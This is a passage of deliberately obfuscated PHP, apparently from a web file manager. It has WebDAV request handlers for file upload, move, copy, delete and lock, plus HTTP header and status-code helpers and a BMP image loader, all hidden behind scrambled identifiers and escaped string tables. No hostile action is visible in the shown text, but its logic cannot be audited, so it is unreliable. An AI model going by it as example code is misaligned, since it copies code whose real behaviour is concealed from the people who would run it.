$_SERVER[Æ¡î¢≠¯™]; $DªâÇ¢çÉ« = $this->pathInfo($this->path); if (!$DªâÇ¢çÉ« || $DªâÇ¢çÉ«[$EÊñ‹¨‚ßí[29]] == $EÊñ‹¨‚ßí[86]) { return array($EÊñ‹¨‚ßí[1018] => 200, $EÊñ‹¨‚ßí[1185] => array($EÊñ‹¨‚ßí[1758])); } return array($EÊñ‹¨‚ßí[1018] => 200, $EÊñ‹¨‚ßí[1185] => array($EÊñ‹¨‚ßí[1759], $EÊñ‹¨‚ßí[146], $EÊñ‹¨‚ßí[1760] . $DªâÇ¢çÉ«[$EÊñ‹¨‚ßí[87]], $EÊñ‹¨‚ßí[1761] . get_file_mime($DªâÇ¢çÉ«[$EÊñ‹¨‚ßí[167]]), $EÊñ‹¨‚ßí[142] . gmdate($EÊñ‹¨‚ßí[1747], $DªâÇ¢çÉ«[$EÊñ‹¨‚ßí[1232]]) . $EÊñ‹¨‚ßí[1762], $EÊñ‹¨‚ßí[1763])); } public function httpOPTIONS() { $AƒóŸ—é“Ú =& $_SERVER[Æ¡î¢≠¯™]; return array($AƒóŸ—é“Ú[1018] => 200, $AƒóŸ—é“Ú[1185] => array($AƒóŸ—é“Ú[1764], $AƒóŸ—é“Ú[1765], $AƒóŸ—é“Ú[1766], $AƒóŸ—é“Ú[1241])); } public function httpPROPPATCH() { $B≠ﬂÈâ–«Ú =& $_SERVER[Æ¡î¢≠¯™]; $F˜Ô‡¡âä = $B≠ﬂÈâ–«Ú[1767] . $_SERVER[$B≠ﬂÈâ–«Ú[1348]] . $B≠ﬂÈâ–«Ú[1768]; return array($B≠ﬂÈâ–«Ú[1755] => 207, $B≠ﬂÈâ–«Ú[1756] => "\74\104\72\155\x75\154\x74\151\163\164\141\x74\x75\x73\x20\170\155\x6c\x6e\x73\x3a\x44\75\x22\x44\101\x56\x3a\42\76\xa{$F˜Ô‡¡âä}\xa\x3c\57\x44\72\155\x75\x6c\x74\x69\x73\164\x61\164\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $e‘∆«Ñ©≤ƒ =& $_SERVER[Æ¡î¢≠¯™]; $CœàëˆØ≈Û = $this->uploadFile(); if ($CœàëˆØ≈Û) { $càÀåØº ¿ = 204; } else { $CœàëˆØ≈Û = $e‘∆«Ñ©≤ƒ[33]; $càÀåØº ¿ = 201; } $EÔÕíËö…â = $this->pathPut($this->path, $CœàëˆØ≈Û); if ($EÔÕíËö…â == !1) { $càÀåØº ¿ = 404; } return array($e‘∆«Ñ©≤ƒ[1755] => $càÀåØº ¿); } private function uploadFile() { goto aÍè≤›Ç±¶; aÍè≤›Ç±¶: $eá•∏ù°äÜ =& $_SERVER[Æ¡î¢≠¯™]; @mk_dir(TEMP_FILES); $B˘·Æû°öŒ = TEMP_FILES . $eá•∏ù°äÜ[1769] . rand_string(32); goto Bñ∏¨øπ∂â; Bñ∏¨øπ∂â: $B‡äõ·›•á = @fopen($B˘·Æû°öŒ, $eá•∏ù°äÜ[1477]); $DÊ‡Èº”¶≥ = @fopen($eá•∏ù°äÜ[1770], $eá•∏ù°äÜ[1476]); if (!$DÊ‡Èº”¶≥ || !$B‡äõ·›•á) { @unlink($B˘·Æû°öŒ); return !1; } goto FòëäÙéøÿ; f´“›—…‡å: if (@filesize($B˘·Æû°öŒ) > 0) { return $B˘·Æû°öŒ; } @unlink($B˘·Æû°öŒ); return !1; goto E¡®ò»€üö; FòëäÙéøÿ: while (!feof($DÊ‡Èº”¶≥)) { fwrite($B‡äõ·›•á, fread($DÊ‡Èº”¶≥, 1024 * 200)); } fclose($DÊ‡Èº”¶≥); fclose($B‡äõ·›•á); goto f´“›—…‡å; E¡®ò»€üö: } public function httpMKCOL() { $D≠çÎÉ®˜π =& $_SERVER[Æ¡î¢≠¯™]; if ($this->pathExists($this->path)) { return array($D≠çÎÉ®˜π[1018] => 409); } $FÈ©ƒ£öæ∫ = $this->pathMkdir($this->path); return array($D≠çÎÉ®˜π[1018] => $FÈ©ƒ£öæ∫ ? 201 : 403); } public function httpMOVE() { $AÃ∏‹á™ÑÈ =& $_SERVER[Æ¡î¢≠¯™]; $AßèƒÆŒàç = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$AÃ∏‹á™ÑÈ[1771]])) { $Fœ„ç‘‘Î»[$AÃ∏‹á™ÑÈ[1772]] = $_SERVER[$AÃ∏‹á™ÑÈ[1771]] == $AÃ∏‹á™ÑÈ[1773]; } $aµÊŸã⁄æŒ = $this->pathMove($this->path, $AßèƒÆŒàç); return array($AÃ∏‹á™ÑÈ[1018] => $aµÊŸã⁄æŒ ? 201 : 404); } public function httpCOPY() { $a’¥ìÑ’“à = $this->parsePath($this->pathGet(!0)); $aÀïÙè°“ü = $this->pathCopy($this->path, $a’¥ìÑ’“à); return array($_SERVER[Æ¡î¢≠¯™][1018] => $aÀïÙè°“ü ? 201 : 404); } public function httpDELETE() { $BÚâ‘Ÿæ“≠ = $this->pathRemove($this->path); return array($_SERVER[Æ¡î¢≠¯™][1018] => $BÚâ‘Ÿæ“≠ ? 200 : 503); } public function httpLOCK() { $fÆŸéæ¿óÉ =& $_SERVER[Æ¡î¢≠¯™]; $bπÜ¬àÁÏ· = md5($this->path); $b∫ëìÖ≥ùç = $fÆŸéæ¿óÉ[1774] . $this->xmlGet($fÆŸéæ¿óÉ[1775]) . $fÆŸéæ¿óÉ[1776] . $bπÜ¬àÁÏ· . $fÆŸéæ¿óÉ[1777]; return array($fÆŸéæ¿óÉ[1018] => 200, $fÆŸéæ¿óÉ[1185] => array($fÆŸéæ¿óÉ[1778] . $bπÜ¬àÁÏ·, $fÆŸéæ¿óÉ[1779]), $fÆŸéæ¿óÉ[1780] => $b∫ëìÖ≥ùç); } public function httpUNLOCK() { return array($_SERVER[Æ¡î¢≠¯™][1018] => 204); } public function xmlGet($eèÊÎŸàÏæ) { goto AÎ˘≤·∏¨˘; Cˆ±·ÖÜﬂ⁄: $E—∫√Û©ï∑ = array_shift(explode($CúÊ‚éõìÊ[8], $eèÊÎŸàÏæ)); $f™üÏ∂û∞¡ = $fı∂â÷è“Á->getElementsByTagNameNS($CúÊ‚éõìÊ[1782], $E—∫√Û©ï∑); if ($f™üÏ∂û∞¡) { return $f™üÏ∂û∞¡[0]->nodeValue; } goto eãå∂áΩÙÖ; eãå∂áΩÙÖ: return $CúÊ‚éõìÊ[33]; goto DüÉπ‡Õ∞Ó; AÎ˘≤·∏¨˘: $CúÊ‚éõìÊ =& $_SERVER[Æ¡î¢≠¯™]; static $fı∂â÷è“Á = false; if (!$fı∂â÷è“Á) { $fÒ ãı…Ÿñ = file_get_contents($CúÊ‚éõìÊ[1781]); $fı∂â÷è“Á = new DOMDocument(); $fı∂â÷è“Á->loadXML($fÒ ãı…Ÿñ); } goto Cˆ±·ÖÜﬂ⁄; DüÉπ‡Õ∞Ó: } public static function response($F∏ç¡”ßΩñ) { goto a≠à≠Ò€ƒ°; a≠à≠Ò€ƒ°: $F«©‚÷≈´è =& $_SERVER[Æ¡î¢≠¯™]; $BØáÙ≠€éÒ = is_array($F∏ç¡”ßΩñ[$F«©‚÷≈´è[1185]]) ? $F∏ç¡”ßΩñ[$F«©‚÷≈´è[1185]] : array(); $BØáÙ≠€éÒ[] = HttpHeader::code($F∏ç¡”ßΩñ[$F«©‚÷≈´è[1018]]); goto a¥ûÌ’èÉß; a¥ûÌ’èÉß: $BØáÙ≠€éÒ[] = $F«©‚÷≈´è[1722]; $BØáÙ≠€éÒ[] = $F«©‚÷≈´è[1723]; foreach ($BØáÙ≠€éÒ as $BŸΩîÉÑﬁ›) { header($BŸΩîÉÑﬁ›); } goto A¿√∆ﬂ√Ãè; A¿√∆ﬂ√Ãè: if (is_string($F∏ç¡”ßΩñ[$F«©‚÷≈´è[1780]])) { header($F«©‚÷≈´è[1783]); $eãïÂÎÓœï = $F«©‚÷≈´è[1784] . $F«©‚÷≈´è[62] . $F∏ç¡”ßΩñ[$F«©‚÷≈´è[1780]]; echo $eãïÂÎÓœï; } goto fÀÇ∞ÚÊ£Ì; fÀÇ∞ÚÊ£Ì: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\110\x54\x54\x50\137\110\117\123\124", "\x55\x73\145\x72\x2d\x41\147\145\x6e\164" => "\x48\x54\124\x50\137\x55\123\x45\x52\x5f\101\107\105\x4e\x54", "\103\x6f\156\164\x65\156\x74\55\x54\x79\160\145" => "\110\x54\x54\x50\x5f\x43\117\x4e\124\x45\116\x54\x5f\x54\131\120\x45", "\x43\157\156\164\x65\156\x74\55\x4c\145\156\x67\x74\150" => "\110\124\124\x50\x5f\x43\x4f\x4e\124\105\x4e\124\137\x4c\x45\x4e\107\x54\110", "\104\145\x70\x74\150" => "\110\124\x54\x50\137\x44\105\120\x54\x48", "\105\x78\160\145\143\164" => "\110\x54\x54\120\x5f\105\x58\120\105\x43\124", "\x49\146\x2d\x4e\157\156\x65\55\115\x61\x74\x63\150" => "\110\x54\x54\x50\x5f\111\x46\137\116\x4f\x4e\x45\137\x4d\101\124\103\x48", "\x49\146\x2d\x4d\141\164\143\150" => "\x48\124\124\x50\x5f\111\x46\137\115\x41\124\x43\x48", "\111\x66\55\x52\141\x6e\x67\x65" => "\110\x54\124\120\x5f\x49\x46\137\122\101\116\x47\105", "\x4c\141\x73\164\x2d\115\157\144\151\x66\x69\x65\144" => "\x48\124\x54\x50\x5f\x4c\x41\x53\x54\x5f\115\x4f\x44\111\106\x49\x45\x44", "\111\x66\x2d\x4d\157\x64\151\146\151\x65\x64\x2d\x53\151\156\143\145" => "\110\124\124\120\137\111\106\x5f\115\117\104\x49\x46\x49\x45\x44\x5f\x53\x49\x4e\x43\x45", "\111\x66\x2d\x55\156\x6d\157\144\x69\146\x69\145\144\x2d\x53\151\x6e\x63\x65" => "\110\x54\x54\x50\137\111\106\137\x55\x4e\x4d\x4f\104\x49\106\x49\x45\x44\137\x53\x49\116\x43\105", "\x52\141\x6e\147\x65" => "\x48\124\x54\120\x5f\122\101\x4e\107\105", "\124\x69\x6d\x65\x6f\165\x74" => "\x48\124\x54\x50\137\x54\111\x4d\x45\x4f\x55\x54", "\x49\x66" => "\x48\x54\124\x50\137\111\106", "\114\157\143\x6b\55\124\157\153\145\156" => "\110\124\x54\120\137\114\117\103\x4b\x5f\124\x4f\x4b\105\x4e", "\117\166\x65\x72\167\162\x69\x74\x65" => "\110\x54\x54\x50\x5f\117\126\x45\122\x57\x52\111\124\105", "\104\145\163\164\151\156\141\x74\x69\x6f\x6e" => "\x48\x54\124\120\x5f\104\x45\x53\124\x49\x4e\x41\x54\x49\x4f\116", "\122\145\x71\165\145\163\x74\x2d\x49\x64" => "\x52\105\x51\125\x45\123\x54\137\111\104", "\x52\x65\161\x75\x65\x73\x74\x2d\x42\x6f\144\171\x2d\106\151\x6c\145" => "\x52\x45\121\x55\x45\123\x54\137\102\117\x44\131\137\x46\111\114\105", "\122\145\144\x69\162\145\x63\164\x2d\x53\164\x61\164\165\163" => "\122\105\x44\111\122\x45\103\124\x5f\x53\124\x41\x54\x55\x53"); public static function init() { static $f∏ÌŸ≈Ú…◊ = false; if ($f∏ÌŸ≈Ú…◊) { return; } foreach ($_SERVER as $aŒÂ”ºµ≤≠ => $f∂ÙàËΩÏ) { $aŒÂ”ºµ≤≠ = strtoupper($aŒÂ”ºµ≤≠); if (!array_key_exists($aŒÂ”ºµ≤≠, $_SERVER)) { continue; } $_SERVER[$aŒÂ”ºµ≤≠] = $f∂ÙàËΩÏ; } foreach (self::$_headers as $aŒÂ”ºµ≤≠ => $C‹ˆ–∆±éØ) { if (!array_key_exists($aŒÂ”ºµ≤≠, $_SERVER)) { continue; } $_SERVER[$aŒÂ”ºµ≤≠] = $_SERVER[$C‹ˆ–∆±éØ]; $_SERVER[strtoupper($aŒÂ”ºµ≤≠)] = $_SERVER[$C‹ˆ–∆±éØ]; } } public static function get($eÏ†ŒπÕ’Ñ) { self::init(); return $_SERVER[$eÏ†ŒπÕ’Ñ] ? $_SERVER[$eÏ†ŒπÕ’Ñ] : $_SERVER[$_SERVER[Æ¡î¢≠¯™][1785] . strtoupper($eÏ†ŒπÕ’Ñ)]; } public static function method() { return strtoupper(self::get($_SERVER[Æ¡î¢≠¯™][161])); } public static function length() { $B«´´ÃÊﬁ‡ =& $_SERVER[Æ¡î¢≠¯™]; $F∑ç  ¨çÜ = self::get($B«´´ÃÊﬁ‡[1786]); if (!$F∑ç  ¨çÜ) { $F∑ç  ¨çÜ = self::get($B«´´ÃÊﬁ‡[1124]); } return $F∑ç  ¨çÜ; } public static function range() { $E›¨Û¨ÕÀà =& $_SERVER[Æ¡î¢≠¯™]; $b§ñ®ßµ’Ú = self::get($E›¨Û¨ÕÀà[205]); if (!$b§ñ®ßµ’Ú) { return !1; } if (!preg_match($E›¨Û¨ÕÀà[1787], $b§ñ®ßµ’Ú, $dπª™íó∑°)) { return !1; } if ($dπª™íó∑°[1] === $E›¨Û¨ÕÀà[33] && $dπª™íó∑°[2] === $E›¨Û¨ÕÀà[33]) { return !1; } return array($dπª™íó∑°[1] !== $E›¨Û¨ÕÀà[33] ? $dπª™íó∑°[1] : null, $dπª™íó∑°[2] !== $E›¨Û¨ÕÀà[33] ? $dπª™íó∑°[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\157\156\164\x69\x6e\165\x65", "\x31\x30\x31" => "\x53\167\151\164\143\150\151\x6e\x67\x20\x50\x72\157\x74\157\x63\157\x6c", "\x31\x30\x32" => "\120\162\x6f\x63\145\x73\163\x69\x6e\x67", "\x31\60\63" => "\105\141\x72\154\x79\x20\110\151\156\164\x73", "\62\60\x30" => "\x4f\113", "\x32\x30\x31" => "\103\x72\145\x61\x74\x65\x64", "\x32\x30\x32" => "\x41\143\x63\145\x70\164\145\x64", "\62\x30\x33" => "\116\x6f\x6e\55\101\165\164\x68\x6f\x72\x69\x74\x61\x74\151\x76\145\x20\111\156\146\x6f\x72\155\141\164\x69\x6f\156", "\x32\x30\64" => "\116\157\40\103\x6f\x6e\x74\145\156\x74", "\62\60\65" => "\x52\145\163\145\164\40\x43\157\156\164\x65\x6e\164", "\62\60\x36" => "\x50\141\162\x74\151\141\154\x20\103\157\x6e\164\145\156\164", "\x32\x30\x37" => "\x4d\x75\x6c\x74\x69\55\123\164\x61\164\x75\163", "\x33\60\x30" => "\x4d\165\154\164\x69\160\x6c\x65\x20\x43\150\x6f\x69\x63\145\x73", "\x33\60\61" => "\x4d\157\166\145\144\x20\120\145\x72\155\x61\156\145\156\x74\x6c\x79", "\x33\60\62" => "\x46\x6f\165\156\144", "\63\x30\x33" => "\x53\x65\145\40\117\164\150\145\x72", "\x33\x30\64" => "\x4e\x6f\x74\40\x4d\157\x64\151\x66\151\145\x64", "\63\60\65" => "\125\163\145\x20\120\162\x6f\x78\171", "\x33\60\x37" => "\x54\x65\x6d\160\x6f\x72\x61\162\171\40\x52\x65\x64\x69\x72\x65\143\164", "\x33\x30\x38" => "\x50\x65\162\155\141\156\x65\x6e\164\x20\122\x65\x64\x69\162\x65\143\x74", "\x34\x30\x30" => "\x42\x61\x64\x20\x52\x65\x71\x75\145\x73\164", "\64\x30\x31" => "\x55\x6e\141\165\x74\x68\x6f\162\151\x7a\x65\x64", "\x34\x30\62" => "\120\141\171\155\145\156\164\40\122\x65\x71\165\151\x72\x65\x64", "\x34\60\x33" => "\106\x6f\162\142\x69\x64\144\145\x6e", "\64\x30\64" => "\116\157\164\40\106\x6f\x75\156\144", "\x34\60\65" => "\x4d\145\164\x68\x6f\144\x20\116\x6f\164\x20\101\x6c\154\157\167\x65\x64", "\64\60\x36" => "\116\x6f\164\40\x41\x63\x63\145\160\164\x61\142\154\x65", "\x34\60\x37" => "\120\162\x6f\170\x79\40\x41\165\164\150\x65\x6e\x74\151\x63\141\164\x69\157\156\x20\122\145\x71\x75\151\x72\145\x64", "\x34\x30\70" => "\122\x65\x71\x75\145\163\164\x20\124\151\155\x65\x6f\165\164", "\64\60\71" => "\x43\157\x6e\146\154\151\143\164", "\64\x31\60" => "\107\x6f\156\145", "\64\61\61" => "\114\145\156\x67\164\x68\40\122\145\161\165\x69\x72\145\x64", "\x34\x31\62" => "\120\x72\x65\143\x6f\x6e\144\x69\164\x69\x6f\156\40\x46\x61\x69\154\145\x64", "\64\61\x33" => "\x52\x65\x71\x75\145\163\164\40\x45\x6e\x74\x69\164\x79\x20\x54\157\x6f\x20\x4c\141\162\147\x65", "\64\61\x34" => "\122\x65\x71\165\145\163\x74\40\x55\122\x49\40\124\x6f\157\x20\114\141\162\147\x65", "\x34\x31\x35" => "\x55\x6e\x73\165\160\x70\x6f\162\164\145\144\40\x4d\x65\x64\151\141\x20\124\x79\x70\145", "\x34\x31\66" => "\122\145\x71\x75\x65\163\164\145\144\x20\122\141\x6e\x67\145\40\x4e\x6f\x74\40\123\x61\164\151\x73\146\151\141\x62\154\145", "\64\x31\x37" => "\x45\170\160\x65\143\x74\x61\x74\151\157\156\x20\x46\141\x69\x6c\x65\144", "\x34\x32\x32" => "\125\156\160\x72\157\x63\x65\163\163\141\x62\x6c\x65\40\105\156\164\x69\164\x79", "\64\62\x33" => "\114\x6f\x63\x6b\145\x64", "\64\x32\x34" => "\106\141\x69\154\x65\144\40\x44\145\160\x65\x6e\x64\x65\156\143\x79", "\64\x32\x35" => "\x55\156\x6f\162\144\x65\x72\145\x64\x20\103\157\154\x6c\x65\x63\164\x69\x6f\156", "\64\62\66" => "\125\x70\147\x72\141\144\x65\x20\122\145\x71\x75\x69\162\x65\x64", "\64\x32\70" => "\120\162\145\143\x6f\x6e\144\x69\164\151\x6f\x6e\40\x52\145\161\165\151\x72\x65\x64", "\x34\62\x39" => "\x54\157\157\40\115\141\x6e\x79\x20\x52\145\161\165\145\x73\164\x73", "\64\x33\61" => "\x52\145\x71\x75\145\163\x74\x20\x48\145\141\144\145\x72\x20\x46\x69\145\154\144\x73\x20\x54\157\x6f\x20\x4c\x61\x72\147\x65", "\x34\64\64" => "\x4e\x6f\40\122\x65\x73\160\157\156\x73\145", "\64\x35\x30" => "\x42\x6c\x6f\x63\153\145\144\x20\142\x79\x20\x57\151\156\144\x6f\x77\x73\40\x50\x61\162\145\x6e\164\141\x6c\40\103\157\x6e\x74\162\157\154\163", "\x34\x35\61" => "\125\156\141\166\141\151\x6c\141\x62\x6c\x65\x20\106\x6f\162\x20\114\x65\147\x61\x6c\x20\122\x65\x61\163\x6f\x6e\163", "\64\71\64" => "\x52\x65\x71\x75\x65\x73\164\x20\x48\145\x61\144\x65\162\40\x54\x6f\x6f\x20\x4c\141\x72\x67\145", "\65\60\60" => "\x49\156\164\x65\162\x6e\x61\x6c\40\x53\145\x72\x76\x65\162\40\105\x72\x72\157\x72", "\65\60\61" => "\x4e\157\x74\40\x49\x6d\x70\x6c\145\155\145\x6e\164\145\144", "\x35\60\62" => "\x42\141\x64\x20\107\141\164\x65\x77\x61\171", "\65\x30\x33" => "\x53\145\x72\166\151\x63\x65\40\125\x6e\141\166\141\151\x6c\141\142\154\x65", "\65\x30\x34" => "\x47\141\164\x65\x77\141\x79\x20\124\x69\x6d\x65\x6f\165\x74", "\x35\x30\x35" => "\x48\124\x54\120\x20\x56\145\162\x73\151\157\x6e\x20\156\157\164\40\x73\x75\x70\x70\x6f\x72\x74\145\144", "\x35\60\x37" => "\111\156\x73\x75\146\146\x69\x63\151\145\156\x74\40\123\x74\157\x72\141\147\145"); public static function code($D›êúº∞É) { $f†Ÿ”¯‹©É =& $_SERVER[Æ¡î¢≠¯™]; $D›êúº∞É = $D›êúº∞É . $f†Ÿ”¯‹©É[33]; $BÖ≥±äç¥∞ = self::$statusCode[$D›êúº∞É]; $BÖ≥±äç¥∞ = $BÖ≥±äç¥∞ ? "\110\x54\x54\120\57\x31\x2e\x31\40{$D›êúº∞É}\x20" . $BÖ≥±äç¥∞ : $f†Ÿ”¯‹©É[33]; return $BÖ≥±äç¥∞; } } class ImageGdBMP { public static function load($EÜ…èªâ±ú) { $föΩµÖÜƒø = fopen($EÜ…èªâ±ú, $_SERVER[Æ¡î¢≠¯™][1476]); if ($föΩµÖÜƒø === !1) { return !1; } $DçŸÎÿ⁄â€ = self::loadFromStream($föΩµÖÜƒø); fclose($föΩµÖÜƒø); return $DçŸÎÿ⁄â€; } public static function loadFromStream($d¬⁄ÿ‘Ôª⁄) { $C„ˆ›èÛâå =& $_SERVER[Æ¡î¢≠¯™]; $e•ôïÙ¨¢π = fread($d¬⁄ÿ‘Ôª⁄, 14); if ($e•ôïÙ¨¢π === !1) { return !1; } if ($e•ôïÙ¨¢π[0] != $C„ˆ›èÛâå[1788] || $e•ôïÙ¨¢π[1] != $C„ˆ›èÛâå[1789]) { return !1; } $d‡√ º¨⁄ò = unpack($C„ˆ›èÛâå[1790] . $C„ˆ›èÛâå[1791] . $C„ˆ›èÛâå[1792] . $C„ˆ›èÛâå[1793] . $C„ˆ›èÛâå[1794], $e•ôïÙ¨¢π); return self::loadFromStreamAndFileHeader($d¬⁄ÿ‘Ôª⁄, $d‡√ º¨⁄ò); } public static function loadFromStreamAndFileHeader($dÍÈµËûÃŸ, array $dú∫Ù©Ø¨È) { goto C∫ΩéëÎ‰Ë; eë›ÍÚóú◊: $F©‘€ñçßì = abs($bµû¨ïÍ…ç); $a∞Éã£∂ˆæ = $bµû¨ïÍ…ç > 0 ? $F©‘€ñçßì - 1 : 0; $b˘ëÇ™°®æ = $bµû¨ïÍ…ç > 0 ? -1 : 1; goto d’…È◊ ©≈; BÿÇËà±·Í: if ($d»Ô˜–Á± == 0 || $bµû¨ïÍ…ç == 0 || $bÒÑÚ–àÒÿ != 1 || ($e´Øß’ﬁ◊â & $bﬂÔòæ∆ ) != 0 || ($e´Øß’ﬁ◊â & $aòÜô¿©±—) != 0 || ($e´Øß’ﬁ◊â & $BãÁ¿è¥ö©) != 0 || ($bﬂÔòæ∆  & $aòÜô¿©±—) != 0 || ($bﬂÔòæ∆  & $BãÁ¿è¥ö©) != 0 || ($aòÜô¿©±— & $BãÁ¿è¥ö©) != 0) { return !1; } if ($e£Æà±¨Ωì == 4 || $e£Æà±¨Ωì == 5) { $fÛ±·¿Â™Ô = stream_get_contents($dÍÈµËûÃŸ, $F·ÇËª’¶ñ); if ($fÛ±·¿Â™Ô === !1) { return !1; } return imagecreatefromstring($fÛ±·¿Â™Ô); } $dˆﬂòùÛëì = $d»Ô˜–Á± * $Eí¨≠ÜÀ√É + 31 >> 3 & ~3; goto eë›ÍÚóú◊; e¢§ÒÆ≠∑Ø: if ($fÛ±·¿Â™Ô === !1) { return !1; } list(, $bëﬁ“Çò£Í) = unpack($cØ®∂ÂÜÏ√[1795], $fÛ±·¿Â™Ô); if ($bëﬁ“Çò£Í == 12) { goto cœ‡ÓÂÓ©»; a´µ£√å·ï: $A·∂«¡—˘… = $C‘“∞Ò‘≥á = $e´Øß’ﬁ◊â = $e£Æà±¨Ωì = 0; $bﬂÔòæ∆  = 16711680; $aòÜô¿©±— = 65280; goto AÉâüä˜Ú⁄; AÉâüä˜Ú⁄: $BãÁ¿è¥ö© = 255; goto AÎÌúÏ√∫´; cœ‡ÓÂÓ©»: $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $bëﬁ“Çò£Í - 4); if ($fÛ±·¿Â™Ô === !1) { return !1; } extract(unpack($cØ®∂ÂÜÏ√[1796] . $cØ®∂ÂÜÏ√[1797] . $cØ®∂ÂÜÏ√[1798] . $cØ®∂ÂÜÏ√[1799], $fÛ±·¿Â™Ô)); goto a´µ£√å·ï; AÎÌúÏ√∫´: } else { if (124 < $bëﬁ“Çò£Í || $bëﬁ“Çò£Í < 40) { return !1; } else { goto aææçÉıæå; aææçÉıæå: $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, 36); if ($fÛ±·¿Â™Ô === !1) { return !1; } extract(unpack($cØ®∂ÂÜÏ√[1800] . $cØ®∂ÂÜÏ√[1801] . $cØ®∂ÂÜÏ√[1798] . $cØ®∂ÂÜÏ√[1802] . $cØ®∂ÂÜÏ√[1803] . $cØ®∂ÂÜÏ√[1804] . $cØ®∂ÂÜÏ√[1805] . $cØ®∂ÂÜÏ√[1806] . $cØ®∂ÂÜÏ√[1807] . $cØ®∂ÂÜÏ√[1808], $fÛ±·¿Â™Ô)); goto DÙË¬´ÿﬁé; F•Ã∏á«ç·: if ($f‘©§÷Ê¥º & 2147483648) { $f‘©§÷Ê¥º = -(~$f‘©§÷Ê¥º & 4294967295) - 1; } if ($dú∫Ù©Ø¨È[$cØ®∂ÂÜÏ√[524]] != 0) { $Bùåæ¬«Éé = $Eí¨≠ÜÀ√É == 1 || $Eí¨≠ÜÀ√É == 4 || $Eí¨≠ÜÀ√É == 8 ? ($A·∂«¡—˘… ? $A·∂«¡—˘… : pow(2, $Eí¨≠ÜÀ√É)) << 2 : 0; $d¿ß´ÕÁ’î = $F·ÇËª’¶ñ ? $F·ÇËª’¶ñ : ($d»Ô˜–Á± * $Eí¨≠ÜÀ√É + 31 >> 3 & ~3) * abs($bµû¨ïÍ…ç); $a‡çÂ∂ıùÑ = $dú∫Ù©Ø¨È[$cØ®∂ÂÜÏ√[524]] - $d¿ß´ÕÁ’î - $Bùåæ¬«Éé - 14; if ($bëﬁ“Çò£Í < $a‡çÂ∂ıùÑ && 40 <= $bëﬁ“Çò£Í && $bëﬁ“Çò£Í <= 124) { $bëﬁ“Çò£Í = $a‡çÂ∂ıùÑ; } } if ($bëﬁ“Çò£Í - 40 > 0) { $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $bëﬁ“Çò£Í - 40); if ($fÛ±·¿Â™Ô === !1) { return !1; } extract(unpack($cØ®∂ÂÜÏ√[1809] . $cØ®∂ÂÜÏ√[1810] . $cØ®∂ÂÜÏ√[1811] . $cØ®∂ÂÜÏ√[1812], $fÛ±·¿Â™Ô . str_repeat($cØ®∂ÂÜÏ√[1813], 120))); } else { $e´Øß’ﬁ◊â = $bﬂÔòæ∆  = $aòÜô¿©±— = $BãÁ¿è¥ö© = 0; } goto CŒÏ≥¬µ∆ë; CŒÏ≥¬µ∆ë: if (($Eí¨≠ÜÀ√É == 16 || $Eí¨≠ÜÀ√É == 24 || $Eí¨≠ÜÀ√É == 32) && $e£Æà±¨Ωì == 0 && $bﬂÔòæ∆  == 0 && $aòÜô¿©±— == 0 && $BãÁ¿è¥ö© == 0) { switch ($Eí¨≠ÜÀ√É) { case 16: $bﬂÔòæ∆  = 31744; $aòÜô¿©±— = 992; $BãÁ¿è¥ö© = 31; break; case 24: case 32: $bﬂÔòæ∆  = 16711680; $aòÜô¿©±— = 65280; $BãÁ¿è¥ö© = 255; break; } } goto e¿’å›±¥ƒ; DÙË¬´ÿﬁé: if ($d»Ô˜–Á± & 2147483648) { $d»Ô˜–Á± = -(~$d»Ô˜–Á± & 4294967295) - 1; } if ($bµû¨ïÍ…ç & 2147483648) { $bµû¨ïÍ…ç = -(~$bµû¨ïÍ…ç & 4294967295) - 1; } if ($f≈≠ÃÑ»Ï® & 2147483648) { $f≈≠ÃÑ»Ï® = -(~$f≈≠ÃÑ»Ï® & 4294967295) - 1; } goto F•Ã∏á«ç·; e¿’å›±¥ƒ: } } goto BÿÇËà±·Í; d’…È◊ ©≈: if ($Eí¨≠ÜÀ√É == 1 || $Eí¨≠ÜÀ√É == 4 || $Eí¨≠ÜÀ√É == 8) { goto fâÍ¡ÕôÉ§; e¢ÊŒ€õ…À: $fËŸÓÚŒî„ = array(); for ($d˜òîôèê¬ = 0; $d˜òîôèê¬ < $B≥™èı£Ñ•; ++$d˜òîôèê¬) { $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $eà˜º◊∞Ë≈); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } extract(unpack($cØ®∂ÂÜÏ√[1814], $fÛ±·¿Â™Ô . $cØ®∂ÂÜÏ√[1813])); $fËŸÓÚŒî„[] = imagecolorallocate($Dëï°ªá¯µ, $d±⁄ÜÀÑê∞, $E‡Ïã⁄” ˆ, $Eá∫ìë›çè); } $C¶πÜÉá—„ = 8 - $Eí¨≠ÜÀ√É; goto bÿ∫∏êàñ◊; bÿ∫∏êàñ◊: $Eøèò§àŒ‹ = (1 << $Eí¨≠ÜÀ√É) - 1 << $C¶πÜÉá—„; if ($e£Æà±¨Ωì == 1 || $e£Æà±¨Ωì == 2) { $céà©≠±–∫ = 0; $fúºÊãﬁ◊û = $Eí¨≠ÜÀ√É >> 2 & 1; for (;;) { if ($céà©≠±–∫ < -1 || $céà©≠±–∫ > $d»Ô˜–Á± || $a∞Éã£∂ˆæ < -1 || $a∞Éã£∂ˆæ > $bµû¨ïÍ…ç) { imagedestroy($Dëï°ªá¯µ); return !1; } $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, 1); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } switch ($fÛ±·¿Â™Ô) { case $cØ®∂ÂÜÏ√[1813]: $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, 1); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } switch ($fÛ±·¿Â™Ô) { case $cØ®∂ÂÜÏ√[1813]: $a∞Éã£∂ˆæ += $b˘ëÇ™°®æ; $céà©≠±–∫ = 0; break; case $cØ®∂ÂÜÏ√[1815]: $a∞Éã£∂ˆæ = 0; $céà©≠±–∫ = 0; break 3; case $cØ®∂ÂÜÏ√[1816]: $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, 2); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } 